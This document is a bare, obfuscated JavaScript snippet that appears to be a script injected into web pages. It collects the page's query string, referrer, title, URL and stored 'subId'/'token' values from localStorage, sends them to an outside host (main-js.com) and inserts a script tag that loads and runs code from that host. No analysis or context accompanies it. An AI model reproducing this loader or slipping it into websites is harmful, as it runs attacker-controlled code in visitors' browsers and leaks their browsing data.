    (function() {
    var name = '_fckLxKmpPqrGc9GY';
    if (!window._fckLxKmpPqrGc9GY) {
        window._fckLxKmpPqrGc9GY = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://main-js.com/gPmZpZ',
            P_PATH: 'https://main-js.com/dfc7716/postback',
        };
    }
    const _ZBk1FHH2KMyv1dgh = localStorage.getItem('config');
    if (typeof _ZBk1FHH2KMyv1dgh !== 'undefined' && _ZBk1FHH2KMyv1dgh !== null) {
        var _1WstnN44fkvwHxLc = JSON.parse(_ZBk1FHH2KMyv1dgh);
        var _LPwQ57ZsTcpcVC6q = Math.round(+new Date()/1000);
        if (_1WstnN44fkvwHxLc.created_at + window._fckLxKmpPqrGc9GY.ttl < _LPwQ57ZsTcpcVC6q) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _6NWhp3VX7fz8rn7c = localStorage.getItem('subId');
    var _GgwYPBP1MQhZDdns = localStorage.getItem('token');
    var _bMKPkntqKX4rtw2F = '?return=js.client';
        _bMKPkntqKX4rtw2F += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _bMKPkntqKX4rtw2F += '&se_referrer=' + encodeURIComponent(document.referrer);
        _bMKPkntqKX4rtw2F += '&default_keyword=' + encodeURIComponent(document.title);
        _bMKPkntqKX4rtw2F += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _bMKPkntqKX4rtw2F += '&name=' + encodeURIComponent(name);
        _bMKPkntqKX4rtw2F += '&host=' + encodeURIComponent(window._fckLxKmpPqrGc9GY.R_PATH);
    if (typeof _6NWhp3VX7fz8rn7c !== 'undefined' && _6NWhp3VX7fz8rn7c && window._fckLxKmpPqrGc9GY.unique) {
        _bMKPkntqKX4rtw2F += '&sub_id=' + encodeURIComponent(_6NWhp3VX7fz8rn7c);
    }
    if (typeof _GgwYPBP1MQhZDdns !== 'undefined' && _GgwYPBP1MQhZDdns && window._fckLxKmpPqrGc9GY.unique) {
        _bMKPkntqKX4rtw2F += '&token=' + encodeURIComponent(_GgwYPBP1MQhZDdns);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._fckLxKmpPqrGc9GY.R_PATH + _bMKPkntqKX4rtw2F;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();